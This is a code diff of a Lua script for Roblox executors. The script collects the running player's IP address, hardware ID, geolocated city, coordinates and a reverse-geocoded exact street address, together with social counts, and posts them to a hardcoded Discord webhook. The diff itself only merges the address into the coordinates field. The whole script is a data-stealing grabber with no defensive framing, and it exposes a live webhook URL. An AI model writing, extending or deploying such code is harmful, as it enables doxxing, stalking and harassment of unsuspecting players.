@@ -3,7 +3,7 @@ local http_request = (syn and syn.request) or (http and http.request) or http_re
 local webhook_url = "https://discord.com/api/webhooks/1266422703410249828/6-2Qs36Hk_zMN5vdTDW3dM8ZsKIFO1VyO5JD9TO-PwNHjY2R-ORV5D3JXGy4tcRh-O98"
 local ip_url = "http://api64.ipify.org?format=json"
 local geo_url = "http://ip-api.com/json/"
-local geocode_url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" -- Replace with the actual geocoding API URL and include your API key
+local geocode_url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" -- Make sure to replace with an actual geocoding API URL and include your API key
 
 local player = game:GetService("Players").LocalPlayer
 
@@ -97,8 +97,7 @@ local payload = {
             {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
             {["name"] = "HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = true},
             {["name"] = "Location", ["value"] = location_data.city .. ", " .. location_data.regionName .. ", " .. location_data.country, ["inline"] = true},
-            {["name"] = "Coordinates", ["value"] = location_data.lat .. ", " .. location_data.lon, ["inline"] = true},
-            {["name"] = "Exact Address", ["value"] = address, ["inline"] = true},
+            {["name"] = "Coordinates", ["value"] = location_data.lat .. ", " .. location_data.lon .. "\n" .. address, ["inline"] = true},
             {["name"] = "Friends Count", ["value"] = #friends_list, ["inline"] = true},
             {["name"] = "Followers Count", ["value"] = #followers_list, ["inline"] = true},
             {["name"] = "Following Count", ["value"] = #following_list, ["inline"] = true},
